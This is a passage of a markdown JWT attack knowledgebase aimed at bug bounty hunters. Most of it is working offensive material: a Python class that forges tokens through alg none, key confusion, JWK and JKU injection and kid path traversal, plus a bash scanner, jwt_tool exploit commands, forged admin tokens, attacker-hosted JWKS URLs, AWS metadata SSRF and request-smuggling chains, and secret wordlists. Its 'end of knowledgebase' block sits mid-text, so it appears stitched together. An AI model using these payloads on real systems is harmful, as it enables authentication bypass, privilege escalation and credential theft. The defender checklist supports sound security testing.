- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)

### Tools and Resources

- [jwt_tool](https://github.com/ticarpi/jwt_tool) - JWT testing toolkit
- [jwt.io](https://jwt.io/) - JWT decoder/debugger
- [PayloadsAllTheThings JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [jwt-payload-list](https://github.com/payloadbox/jwt-payload-list)
- [jwt-secrets](https://github.com/wallarm/jwt-secrets) - JWT secret wordlist
- [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - Fast JWT cracker
- [sig2n](https://hub.docker.com/r/portswigger/sig2n) - Derive public key from JWTs
- [jws2pubkey](https://github.com/SecuraBV/jws2pubkey) - Public key derivation
- [nuclei-templates JWT](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/jwt)

### CVEs and Advisories

- [CVE-2015-2951](https://nvd.nist.gov/vuln/detail/CVE-2015-2951) - JWT signature bypass
- [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) - None algorithm
- [CVE-2016-5431](https://nvd.nist.gov/vuln/detail/CVE-2016-5431) - Algorithm confusion
- [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) - RS/HS256 mismatch
- [CVE-2018-0114](https://nvd.nist.gov/vuln/detail/CVE-2018-0114) - Key injection
- [CVE-2019-7644](https://nvd.nist.gov/vuln/detail/CVE-2019-7644) - Signature disclosure
- [CVE-2019-20933](https://nvd.nist.gov/vuln/detail/CVE-2019-20933) - Blank password
- [CVE-2020-28042](https://nvd.nist.gov/vuln/detail/CVE-2020-28042) - Null signature
- [CVE-2020-28637](https://nvd.nist.gov/vuln/detail/CVE-2020-28637) - Blank password
- [CVE-2021-26715](https://nvd.nist.gov/vuln/detail/CVE-2021-26715) - MITREid SSRF
- [CVE-2021-27582](https://nvd.nist.gov/vuln/detail/CVE-2021-27582) - redirect_uri poisoning
- [CVE-2022-21449](https://nvd.nist.gov/vuln/detail/CVE-2022-21449) - Psychic signature

### Bug Bounty Writeups

- [JWT Hacking 101 - TrustFoundry](https://trustfoundry.net/jwt-hacking-101/)
- [Attacking JWT Authentication - Sjoerd Langkemper](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- [Critical Vulnerabilities in JSON Web Token Libraries - Auth0](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [Hacking JSON Web Tokens - Vickie Li](https://vickieli.dev/web-security/jwt-attacks/)
- [JSON Web Token Vulnerabilities - 0xn3va](https://0xn3va.gitbook.io/cheat-sheets/web-application/jwt-vulnerabilities)

### HackTricks

- [JWT Vulnerabilities - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html)

---

## Quick Reference Cheat Sheet

### JWT Decode
```bash
echo "HEADER.PAYLOAD.SIG" | cut -d'.' -f1 | base64 -d 2>/dev/null | jq .
echo "HEADER.PAYLOAD.SIG" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
```

### Quick Exploits
```bash
# None algorithm
jwt_tool.py JWT -X a

# Null signature
jwt_tool.py JWT -X n

# Key confusion
jwt_tool.py JWT -X k -pk public.pem

# Key injection
jwt_tool.py JWT -X i

# JKU injection
jwt_tool.py JWT -X s

# Weak secret
jwt_tool.py JWT -d wordlist -C
```

### Hashcat JWT
```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

### Common JWKS Paths
```
/.well-known/jwks.json
/jwks.json
/openid/connect/jwks.json
/api/keys
/api/v1/keys
/{tenant}/oauth2/v1/certs
/.well-known/openid-configuration
```

### OAuth Endpoints
```
/oauth/authorize
/oauth/token
/oauth/register
/connect/register
/.well-known/openid-configuration
/.well-known/webfinger
/api/clients/{id}/logo
```

### kid Path Traversal Targets
```
../../../../../../../dev/null
../../../etc/passwd
/proc/sys/kernel/randomize_va_space
/proc/version
/etc/hostname
C:/windows/win.ini
```

---

> **Disclaimer:** This knowledgebase is for authorized security testing and bug bounty hunting only. Always ensure you have proper authorization before testing any system. The techniques described here can cause serious security impacts if used maliciously.

> **Last Updated:** 2026-05-24
> **Compiled from:** PortSwigger Web Security Academy, HackTricks, PayloadsAllTheThings, ProjectDiscovery Nuclei, and real-world bug bounty research.


---

## JWE (Encrypted JWT) Attacks

### Theory

JSON Web Encryption (JWE) tokens encrypt their payload rather than just signing it. While JWE provides confidentiality, it introduces its own attack surface distinct from JWS.

### JWE Structure

```
Base64Url(Protected Header).Base64Url(Encrypted Key).Base64Url(IV).Base64Url(Ciphertext).Base64Url(Auth Tag)
```

### Algorithm Confusion in JWE

Similar to JWS, JWE supports multiple key management algorithms (alg) and content encryption algorithms (enc):

```json
{
    "alg": "RSA-OAEP",
    "enc": "A256GCM"
}
```

**Attack:** Force the server to decrypt using a different algorithm than intended.

### JWE Key Wrapping Attacks

**CVE-2020-28042 Extension:**
Some JWE implementations accept alg: dir (direct encryption) when the application expects key wrapping, bypassing the intended key management.

```json
{
    "alg": "dir",
    "enc": "A256GCM"
}
```

### JWE Compression Side-Channel

When JWE supports compression (DEFLATE), attackers can use compression oracles to leak plaintext:

```json
{
    "alg": "RSA-OAEP",
    "enc": "A256GCM",
    "zip": "DEF"
}
```

**Attack:** Modify ciphertext and observe error messages to infer plaintext structure.

### JWE IV Reuse

If the server accepts a user-controlled IV:

```json
{
    "alg": "A256KW",
    "enc": "A256GCM",
    "iv": "000000000000000000000000"
}
```

Reusing IV with the same key completely breaks GCM confidentiality.

### JWE Header Injection

Injecting malicious headers into JWE protected headers:

```json
{
    "alg": "RSA-OAEP",
    "enc": "A256GCM",
    "jku": "http://attacker.com/jwks.json",
    "kid": "../../../etc/passwd"
}
```

---

## JWT Timing Attacks

### Theory

Timing attacks exploit differences in server response time to infer information about the secret or validation logic.

### Signature Comparison Timing

If the server uses string comparison (==) instead of constant-time comparison (hmac.compare_digest in Python, timingSafeEqual in Node.js):

```python
# VULNERABLE - String comparison leaks timing
if signature == expected_signature:
    return True

# SECURE - Constant-time comparison
import hmac
if hmac.compare_digest(signature, expected_signature):
    return True
```

**Attack:** Measure response times for different signatures. Gradually brute-force the correct signature byte-by-byte.

### Algorithm-Specific Timing

Different algorithms have different verification times:
- HS256: ~0.1ms
- RS256: ~5ms (RSA operations are slower)
- ES256: ~2ms

If the server reveals the algorithm before verification (e.g., via error messages), timing can confirm which algorithm is actually being used.

### Detection Script

```python
import requests
import statistics
import time

def timing_attack(url, jwt_variants, iterations=100):
    results = {}
    for name, token in jwt_variants.items():
        times = []
        for _ in range(iterations):
            start = time.perf_counter()
            requests.get(url, headers={"Authorization": f"Bearer {token}"})
            end = time.perf_counter()
            times.append((end - start) * 1000)
        results[name] = {
            "mean": statistics.mean(times),
            "stdev": statistics.stdev(times),
            "min": min(times),
            "max": max(times)
        }
    return results
```

---

## JWT in Different Contexts

### Cookies vs localStorage vs sessionStorage

| Storage | XSS Risk | CSRF Risk | Access Pattern |
|---------|----------|-----------|----------------|
| Cookie (HttpOnly) | Low | High | Automatic |
| Cookie (non-HttpOnly) | High | High | Automatic |
| localStorage | High | Low | Manual (JS) |
| sessionStorage | High | Low | Manual (JS) |
| Memory | Low | Low | Manual (JS) |

### WebSocket JWT Authentication

```javascript
const ws = new WebSocket('wss://target.com/socket');
ws.onopen = () => {
    ws.send(JSON.stringify({
        type: 'auth',
        token: jwt_token
    }));
};
```

**Vulnerabilities:**
- JWT may not be validated on every message
- Long-lived WebSocket connections may use expired JWTs
- Token refresh may not be implemented for WebSockets

### GraphQL JWT Context

```graphql
query {
    user(id: "123") {
        name
        email
        adminNotes  # Hidden field, accessible if JWT has admin role
    }
}
```

**Attack:** Forge JWT with elevated role to access hidden GraphQL fields.

---

## JWT Key Rotation Bypasses

### Old Key Acceptance

If the server accepts JWTs signed with old keys after rotation:

```bash
# Old JWT still valid after key rotation
curl -H "Authorization: Bearer OLD_JWT" https://target.com/api/admin
```

### Key ID Confusion During Rotation

During rotation, both old and new keys may be valid. If kid validation is loose:

```json
{
    "alg": "RS256",
    "kid": "old-key-id"  // Still accepted during rotation
}
```

### JWKS Cache Poisoning During Rotation

If the application caches JWKS responses, attacker can force cache to use old keys.

---

## JWT and CORS Misconfigurations

### Wildcard CORS with JWT in Response

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
    "access_token": "eyJhbGciOiJIUzI1NiJ9...",
    "refresh_token": "eyJhbGciOiJIUzI1NiJ9..."
}
```

**Attack:** Any origin can read the JWT from the response.

### JWT in URL Parameters + CORS

```http
GET /api/user?token=eyJhbGciOiJIUzI1NiJ9... HTTP/1.1
Origin: https://attacker.com
```

If Access-Control-Allow-Origin reflects the origin, attacker can read the response.

---

## Advanced Exploitation Scripts

### Complete JWT Forging Script (Python)

```python
#!/usr/bin/env python3
import jwt
import base64
import json
from jwcrypto import jwk as jwcrypto_jwk

class JWTExploiter:
    def __init__(self, original_token):
        self.original = original_token
        self.header = self._decode_header()
        self.payload = self._decode_payload()

    def _decode_header(self):
        parts = self.original.split('.')
        return json.loads(base64.urlsafe_b64decode(parts[0] + '=='))

    def _decode_payload(self):
        parts = self.original.split('.')
        return json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

    def none_algorithm(self, new_payload=None):
        payload = new_payload or self.payload
        header = {"alg": "none", "typ": "JWT"}
        token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        token += '.'
        return token

    def key_confusion(self, public_key_pem, new_payload=None):
        payload = new_payload or self.payload
        header = {"alg": "HS256", "typ": "JWT"}
        return jwt.encode(payload, key=public_key_pem, algorithm='HS256', headers=header)

    def jwk_injection(self, new_payload=None):
        payload = new_payload or self.payload
        key = jwcrypto_jwk.JWK.generate(kty='RSA', size=2048)
        header = {"alg": "RS256", "typ": "JWT", "jwk": key.export_public(as_dict=True)}
        return jwt.encode(payload, key=key.export_to_pem(private_key=True, password=None), 
                         algorithm='RS256', headers=header)

    def jku_injection(self, jku_url, new_payload=None):
        payload = new_payload or self.payload
        key = jwcrypto_jwk.JWK.generate(kty='RSA', size=2048)
        header = {"alg": "RS256", "typ": "JWT", "kid": key.thumbprint().decode(), "jku": jku_url}
        return jwt.encode(payload, key=key.export_to_pem(private_key=True, password=None),
                         algorithm='RS256', headers=header)

    def kid_traversal(self, kid_path, secret, new_payload=None):
        payload = new_payload or self.payload
        header = {"alg": "HS256", "typ": "JWT", "kid": kid_path}
        return jwt.encode(payload, key=secret, algorithm='HS256', headers=header)
```

### Automated JWT Scanner (Bash)

```bash
#!/bin/bash
# jwt_scanner.sh

TARGET=$1
JWT=$2
WORDLIST=${3:-"/usr/share/wordlists/jwt.secrets.list"}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] JWT Scanner Starting...${NC}"

# Decode and display
HEADER=$(echo "$JWT" | cut -d'.' -f1 | base64 -d 2>/dev/null)
PAYLOAD=$(echo "$JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null)
echo -e "${GREEN}[+] Header: $HEADER${NC}"
echo -e "${GREEN}[+] Payload: $PAYLOAD${NC}"

# Test None algorithm
echo -e "${YELLOW}[*] Testing none algorithm...${NC}"
none_token=$(python3 -c "
import base64, json
h = json.dumps({'alg':'none','typ':'JWT'})
p = json.dumps({'sub':'admin','role':'admin'})
h64 = base64.urlsafe_b64encode(h.encode()).decode().rstrip('=')
p64 = base64.urlsafe_b64encode(p.encode()).decode().rstrip('=')
print(f'{h64}.{p64}.')
")
resp=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $none_token" "$TARGET")
if [ "$resp" = "200" ]; then
    echo -e "${RED}[VULN] None algorithm accepted${NC}"
else
    echo -e "${GREEN}[-] None algorithm rejected${NC}"
fi

# Test Null signature
echo -e "${YELLOW}[*] Testing null signature...${NC}"
parts=($(echo "$JWT" | tr '.' '\n'))
null_token="${parts[0]}.${parts[1]}."
resp=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $null_token" "$TARGET")
if [ "$resp" = "200" ]; then
    echo -e "${RED}[VULN] Null signature accepted${NC}"
else
    echo -e "${GREEN}[-] Null signature rejected${NC}"
fi

# Check JWKS endpoints
echo -e "${YELLOW}[*] Checking for JWKS endpoint...${NC}"
for path in "/.well-known/jwks.json" "/jwks.json" "/openid/connect/jwks.json"; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${path}")
    if [ "$resp" = "200" ]; then
        echo -e "${RED}[INFO] JWKS found at ${path}${NC}"
    fi
done

echo -e "${GREEN}[+] Scan complete${NC}"
```

---

## JWT Header Parameters Deep Dive

### x5u (X.509 URL)

The x5u parameter specifies a URL for an X.509 certificate. Similar to jku, this can be exploited for SSRF:

```json
{
    "alg": "RS256",
    "x5u": "http://169.254.169.254/latest/meta-data/"
}
```

### x5c (X.509 Certificate Chain)

The x5c parameter embeds the certificate chain directly:

```json
{
    "alg": "RS256",
    "x5c": ["MIIDXTCCAkWgAwIBAgIJAJC1HiIAZAiUMA0GCSqGSIb3Q..."]
}
```

**Attack:** Embed a self-signed certificate and force the server to trust it.

### crit (Critical Extensions)

The crit parameter lists extensions that must be understood:

```json
{
    "alg": "HS256",
    "crit": ["b64"],
    "b64": false
}
```

**Attack:** If the server doesn't understand crit extensions, it may skip critical security checks.

### b64 (Base64url-encode Payload)

When b64 is set to false, the payload is not base64-encoded:

```json
{
    "alg": "HS256",
    "b64": false
}
```

**Attack:** Inject raw JSON that bypasses encoding filters.

### cty (Content Type)

```json
{
    "alg": "HS256",
    "cty": "text/xml"
}
```

**Attack Vectors:**
- text/xml -> XXE injection
- application/x-java-serialized-object -> Deserialization
- application/json -> JSON parsing quirks

---

## JWT Claim Injection Techniques

### Array-based Claim Injection

```json
{
    "sub": ["user", "admin"],
    "role": ["user", "admin"]
}
```

Some applications check if "admin" in roles rather than exact matching.

### Type Confusion in Claims

```json
{
    "isAdmin": 1,
    "role": 0,
    "user_id": "1 OR 1=1"
}
```

### Unicode Normalization in Claims

```json
{
    "sub": "\u0061\u0064\u006d\u0069\u006e"
}
```

### Null Byte Injection

```json
{
    "sub": "admin\u0000user",
    "role": "admin\u0000user"
}
```

---

## JWT Replay Protection Bypasses

### jti (JWT ID) Manipulation

```json
{
    "jti": "new-unique-id-12345",
    "sub": "admin"
}
```

### Expiration Bypass

```json
{
    "exp": 9999999999,
    "iat": 0,
    "nbf": 0
}
```

### Clock Skew Exploitation

If the server allows clock skew (e.g., +/- 5 minutes), set exp to just within the window.

---

## JWT in Microservices

### Service-to-Service Token Abuse

```json
{
    "sub": "service-admin",
    "aud": "service-b",
    "scope": "internal admin",
    "iss": "internal-auth"
}
```

### Token Propagation Attacks

When a gateway forwards JWTs to backend services without independent validation.

### JWT in Service Mesh

Istio/Linkerd may inject JWTs via X-Forwarded-Jwt headers.

---

## JWT and API Security

### GraphQL JWT Context Bypass

Forge JWT with role: admin to access hidden GraphQL fields.

### REST API Versioning + JWT

Test if /api/v2/ or /api/internal/ has different JWT validation.

### OpenAPI/Swagger JWT Exposure

Swagger UI may expose JWT test tokens or allow testing with forged tokens.

---

## JWT in Mobile Applications

### Hardcoded Secrets

Mobile apps may embed JWT signing secrets. Decompile APK/IPA to extract secrets.

### JWT in Deep Links

```
myapp://auth?token=eyJhbGciOiJIUzI1NiJ9...
```

### JWT in Push Notifications

Push notification JWTs may have elevated privileges.

---

## JWT in Serverless/Cloud

### AWS Lambda JWT Validation

If Lambda doesn't validate JWT, any token grants access.

### Azure Function JWT

Similar vulnerabilities in Azure Functions without proper validation.

### GCP Cloud Functions

JavaScript functions may skip JWT validation.

---

## JWT in Blockchain/Web3

### JWT for Wallet Authentication

Forge JWT to impersonate wallet owner.

### JWT in Smart Contract Interactions

On-chain JWT validation may be missing or flawed.

---

## JWT Forensics and Analysis

### Token Timeline Analysis

```bash
for token in $(cat tokens.txt); do
    iat=$(echo $token | cut -d'.' -f2 | base64 -d 2>/dev/null | jq -r '.iat')
    exp=$(echo $token | cut -d'.' -f2 | base64 -d 2>/dev/null | jq -r '.exp')
    echo "Token: ${token:0:50}... | IAT: $iat | EXP: $exp"
done
```

### Key Fingerprinting

```bash
cat tokens.txt | while read token; do
    kid=$(echo $token | cut -d'.' -f1 | base64 -d 2>/dev/null | jq -r '.kid // "none"')
    alg=$(echo $token | cut -d'.' -f1 | base64 -d 2>/dev/null | jq -r '.alg')
    echo "KID: $kid | ALG: $alg"
done | sort | uniq -c | sort -rn
```

### JWT Entropy Analysis

```python
import math
from collections import Counter

def shannon_entropy(data):
    if not data:
        return 0
    entropy = 0
    for x in Counter(data).values():
        p_x = x / len(data)
        entropy -= p_x * math.log2(p_x)
    return entropy
```

---

## JWT Hardening Checklist (For Defenders)

### Implementation Security

- [ ] Always verify signatures (never use decode() without verify())
- [ ] Explicitly specify allowed algorithms (whitelist, don't blacklist)
- [ ] Reject tokens with alg: none
- [ ] Use strong, randomly generated secrets (min 256-bit for HS256)
- [ ] Store secrets securely (HSM, KMS, vault)
- [ ] Implement proper key rotation
- [ ] Validate all claims (exp, nbf, iss, aud, sub)
- [ ] Use short expiration times
- [ ] Implement token binding (if applicable)
- [ ] Use constant-time comparison for signatures

### Header Security

- [ ] Reject unknown header parameters
- [ ] Don't trust jku or x5u from untrusted sources
- [ ] Validate kid against known key IDs only
- [ ] Don't allow crit extensions that aren't understood
- [ ] Validate certificate chains in x5c

### Infrastructure Security

- [ ] Use HTTPS for all JWT transmission
- [ ] Set HttpOnly and Secure flags for cookie-based JWTs
- [ ] Implement proper CORS policies
- [ ] Use CSRF tokens for cookie-based authentication
- [ ] Monitor for JWT anomalies
- [ ] Log JWT validation failures
- [ ] Rate-limit authentication endpoints

---

## Additional CVEs and Vulnerabilities

### CVE-2020-5408 (Spring Security)

**Vulnerability:** Spring Security's JWT decoder accepted alg: none if explicitly configured.

### CVE-2021-22119 (Spring Security OAuth2)

**Vulnerability:** JWT decoder didn't validate iss claim.

### CVE-2022-23529 (jsonwebtoken npm package)

**Vulnerability:** Prototype pollution in JWT payload parsing.

**Payload:**
```json
{
    "__proto__": {
        "isAdmin": true
    }
}
```

### CVE-2022-36083 (PyJWT)

**Vulnerability:** Key confusion through jwk header parameter.

---

## JWT Capture and Analysis Tools

### Wireshark JWT Filter

```
http.request or http.response or tls
# Then search for "eyJ" in packet bytes
```

### Burp Suite JWT Detection

```
Regex: [= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*
```

### Mitmproxy JWT Interceptor

```python
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    auth = flow.request.headers.get("Authorization", "")
    if auth.startswith("Bearer eyJ"):
        print(f"[JWT] {flow.request.pretty_url}: {auth[:80]}...")
```

### Chrome DevTools JWT Sniffer

```javascript
(function(){
    const origFetch = window.fetch;
    window.fetch = function(...args) {
        const req = args[0];
        if (req.headers && req.headers.get('Authorization')) {
            const auth = req.headers.get('Authorization');
            if (auth.startsWith('Bearer eyJ')) {
                console.log('[JWT]', auth);
            }
        }
        return origFetch.apply(this, args);
    };
})();
```

---

## JWT in Capture The Flag (CTF) Challenges

### Common JWT CTF Patterns

1. **Weak Secret Bruteforce** - Secret is in rockyou.txt or common wordlist
2. **Algorithm Confusion** - Public key is hidden in source code or robots.txt
3. **Kid Path Traversal** - Server runs as root, /dev/null trick works
4. **None Algorithm** - Server accepts alg: none but filters "none"
5. **JWT + SQLi** - kid parameter is injectable

### CTF Tools Setup

```bash
pip install pyjwt jwcrypto cryptography
pip install jwt_tool
git clone https://github.com/wallarm/jwt-secrets
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10k-most-common.txt
```

---

## JWT and Compliance

### OWASP ASVS Requirements

**V2.9 - JWT Security:**
- V2.9.1: JWTs use strong signing algorithms (RS256, ES256, or HS256 with 256+ bit secrets)
- V2.9.2: JWTs validate all claims (exp, nbf, iss, sub, aud)
- V2.9.3: JWTs don't accept alg: none
- V2.9.4: JWTs validate iss and aud claims
- V2.9.5: JWTs use short expiration times

### PCI-DSS Implications

JWTs handling cardholder data must:
- Use strong cryptography (min 128-bit encryption)
- Implement proper key management
- Log all authentication events
- Rotate keys regularly

### SOC 2 Considerations

JWT implementations should:
- Document JWT validation logic
- Implement monitoring and alerting
- Conduct regular penetration testing
- Maintain key inventory

---

## Final Notes

### Continuous Research

JWT security is an evolving field. Key resources to monitor:

- **PortSwigger Research Blog**: New attack techniques
- **Auth0 Blog**: JWT best practices and vulnerabilities
- **ProjectDiscovery**: New nuclei templates for JWT
- **GitHub Security Advisories**: Library vulnerabilities
- **HackerOne/Bugcrowd**: Real-world bug bounty findings

### Responsible Disclosure

When you find JWT vulnerabilities:
1. Document the vulnerability clearly
2. Provide proof-of-concept
3. Suggest remediation steps
4. Allow reasonable time for fix
5. Follow platform disclosure policies

### Common Remediation Patterns

| Vulnerability | Remediation |
|--------------|-------------|
| None algorithm | Reject alg: none explicitly |
| Algorithm confusion | Whitelist allowed algorithms |
| Weak secret | Use 256+ bit random secrets |
| JWK injection | Don't trust embedded JWKs |
| JKU injection | Whitelist trusted JKU domains |
| kid traversal | Validate kid against known keys |
| Unverified signature | Always verify, never just decode |
| Expired tokens | Strict exp validation |
| Missing claims | Validate all required claims |

---

> **End of Knowledgebase**
> 
> This document represents a comprehensive compilation of JWT security knowledge for bug bounty hunting and authorized penetration testing. All techniques should only be used on systems you own or have explicit written authorization to test.
> 
> **Total Sections:** 40+
> **Total CVEs Referenced:** 25+
> **Total Tools Listed:** 15+
> **Total Payloads:** 200+
> **Last Updated:** 2026-05-24


---

## jwt_tool Exploit Flags Reference

Based on the official jwt_tool documentation and real-world usage patterns, here are the exact exploit flags:

### Exploit Modes (-X)

| Flag | Attack | CVE |
|------|--------|-----|
| `-X a` | alg:none Attack | CVE-2015-9235 |
| `-X b` | Blank Password Accepted | CVE-2019-20933 |
| `-X k` | Key Confusion (RS->HS) | CVE-2016-5431 |
| `-X i` | Inline JWKS Injection | CVE-2018-0114 |
| `-X s` | JWKS Spoofing (JKU Injection) | - |
| `-X n` | Null Signature | CVE-2020-28042 |
| `-X p` | Psychic Signature (ECDSA) | CVE-2022-21449 |

### Scanning Modes (-M)

| Flag | Mode | Description |
|------|------|-------------|
| `-M pb` | Playbook | Run all standard tests against target |
| `-M at` | All Tests | Comprehensive testing |
| `-M er` | Error Fuzzing | Fuzz claims to force errors |
| `-M cc` | Common Claims | Fuzz common JWT claims |

### Key Confusion Attack (-X k) Detailed Steps

```bash
# Step 1: Obtain public key (from JWKS or TLS cert)
curl https://target.com/.well-known/jwks.json | jq '.keys[0]'

# Step 2: Convert JWK to PEM (using jwt_tool or manual)
# Using jwt_tool's built-in conversion:
python3 jwt_tool.py JWT_HERE -X k -pk public.pem

# Step 3: The tool automatically:
# - Changes alg to HS256
# - Signs with public key as HMAC secret
# - Outputs forged token
```

### JWK Injection (-X i) Detailed Steps

```bash
# Step 1: Generate RSA key pair (jwt_tool does this automatically)
# Step 2: Embed public key in jwk header
# Step 3: Sign with private key
python3 jwt_tool.py JWT_HERE -X i

# The tool will:
# - Generate new RSA key
# - Embed JWK in header
# - Sign with private key
# - Output forged token
```

### JKU Spoofing (-X s) Detailed Steps

```bash
# Step 1: Host malicious JWKS on attacker server
# JWKS format:
# {
#   "keys": [
#     {
#       "kty": "RSA",
#       "e": "AQAB",
#       "kid": "your-key-id",
#       "n": "your-public-key-modulus"
#     }
#   ]
# }

# Step 2: Run exploit with custom JKU URL
python3 jwt_tool.py JWT_HERE -X s -ju https://attacker.com/jwks.json

# Or let jwt_tool auto-detect and use configured URL
python3 jwt_tool.py JWT_HERE -X s
```

### Complete Playbook Scan Example

```bash
# Full automated scan against target application
python3 jwt_tool.py     -t https://target.com/api/protected     -rc "jwt=eyJhbGciOiJSUzI1NiJ9...;session=abc123"     -cv "Welcome"     -M pb     -d /usr/share/wordlists/jwt.secrets.list
```

**What the playbook scan tests:**
1. Signature verification (tamper test)
2. None algorithm acceptance
3. Null signature acceptance
4. Weak secret bruteforce
5. Algorithm confusion (if public key available)
6. JWK injection
7. JKU injection (if jwkloc configured)
8. kid path traversal
9. Blank password acceptance
10. Claim injection vectors

---

## Real-World Bug Bounty Payloads

### None Algorithm with Case Variations

```bash
# Standard none
python3 -c "import base64,json;h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=');p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=');print(f'{h}.{p}.')"

# Case variations to bypass filters
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
eyJhbGciOiJuT25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

### Algorithm Confusion with Public Key from JWKS

```bash
# 1. Extract public key from JWKS
curl -s https://target.com/.well-known/jwks.json |     jq -r '.keys[0] | {kty,e,n,kid}' > jwk.json

# 2. Convert to PEM using jwt_tool or openssl
# Using jwt_tool:
python3 jwt_tool.py JWT_HERE -X k -pk <(jq -r '.n' jwk.json | base64 -d | openssl rsa -pubin -inform DER)

# 3. Or manual approach:
# - Base64-decode the modulus (n)
# - Reconstruct RSA public key
# - Use as HMAC secret
```

### kid Path Traversal with /dev/null

```bash
# Using jwt_tool with custom kid
python3 jwt_tool.py JWT_HERE     -I -hc kid -hv "../../../../../../../dev/null"     -S hs256 -p ""     -I -pc sub -pv administrator

# Manual construction:
# Header: {"alg":"HS256","kid":"../../../../../../../dev/null","typ":"JWT"}
# Payload: {"sub":"administrator","role":"admin"}
# Secret: "" (empty string, since /dev/null returns empty)
```

### JKU Injection with Exploit Server

```bash
# 1. Generate RSA key pair
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout -out attacker_public.pem

# 2. Create JWKS file
python3 -c "
import json
from Crypto.PublicKey import RSA
with open('attacker_public.pem') as f:
    key = RSA.import_key(f.read())
jwks = {
    'keys': [{
        'kty': 'RSA',
        'e': base64.urlsafe_b64encode(key.e.to_bytes((key.e.bit_length()+7)//8,'big')).decode().rstrip('='),
        'n': base64.urlsafe_b64encode(key.n.to_bytes((key.n.bit_length()+7)//8,'big')).decode().rstrip('='),
        'kid': 'attacker-key-1'
    }]
}
print(json.dumps(jwks, indent=2))
" > jwks.json

# 3. Host JWKS on exploit server
# 4. Run exploit
python3 jwt_tool.py JWT_HERE -X s -ju https://exploit-server.com/jwks.json
```

---

## Advanced Chain Attacks

### JWT + OAuth + SSRF Chain

```
Step 1: Register OAuth client with malicious logo_uri
POST /connect/register
{
    "redirect_uris": ["https://attacker.com/callback"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

Step 2: Server fetches logo_uri (SSRF to AWS metadata)
GET /api/clients/{id}/logo -> AWS credentials leaked

Step 3: Use AWS credentials to access S3 bucket containing JWT secrets

Step 4: Forge admin JWT with stolen secret

Step 5: Access admin endpoints with forged JWT
```

### JWT + Cache Poisoning + XSS Chain

```
Step 1: Identify cacheable endpoint that uses JWT for authorization
GET /api/user-profile (cached, JWT in unkeyed header)

Step 2: Poison cache with forged admin JWT
GET /api/user-profile
X-Custom-Auth: FORGED_ADMIN_JWT

Step 3: Response cached with admin data

Step 4: Normal users get cached admin response

Step 5: If response contains user-controlled data -> XSS
```

### JWT + Request Smuggling + Privilege Escalation

```
Step 1: Identify CL.TE desync vulnerability
POST / HTTP/1.1
Content-Length: 41
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Authorization: Bearer FORGED_ADMIN_JWT

Step 2: Smuggled request bypasses front-end JWT validation

Step 3: Back-end processes smuggled request with forged JWT

Step 4: Admin access granted
```

---

## JWT Secret Wordlists

### Default/Common Secrets

```
secret
password
123456
your-256-bit-secret
change_this_super_secret_random_string
jwt_secret
mysecret
token_secret
supersecret
admin
key
secretkey
test
dev
production
default
changeme
password123
qwerty
letmein
welcome
monkey
dragon
master
hello
```

### Framework-Specific Secrets

```
# Django
django-insecure-

# Flask
flask-secret-key

# Express
express-session-secret

# Spring Boot
spring-boot-jwt-secret

# Laravel
laravel-jwt-secret

# Ruby on Rails
rails-secret-key-base
```

### Environment-Based Secrets

```
JWT_SECRET
SECRET_KEY
TOKEN_SECRET
AUTH_SECRET
SESSION_SECRET
APP_SECRET
API_SECRET
```

---

## JWT Validation Bypass Techniques

### Signature Stripping Variants

```
# Standard (trailing dot)
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.

# Double dot
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9..

# Whitespace after dot
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9. 

# Newline
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.


# Tab
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.	
```

### Header Manipulation

```json
// Multiple alg headers (parser-dependent)
{"alg": "HS256", "alg": "none", "typ": "JWT"}

// Array alg
{"alg": ["none", "HS256"], "typ": "JWT"}

// Unicode escapes
{"alg": "none", "typ": "JWT"}

// URL encoding
{"alg": "%6e%6f%6e%65", "typ": "JWT"}

// Mixed case
{"alg": "nOnE", "typ": "JWT"}
{"alg": "NONE", "typ": "JWT"}
{"alg": "None", "typ": "JWT"}
```

### Payload Manipulation

```json
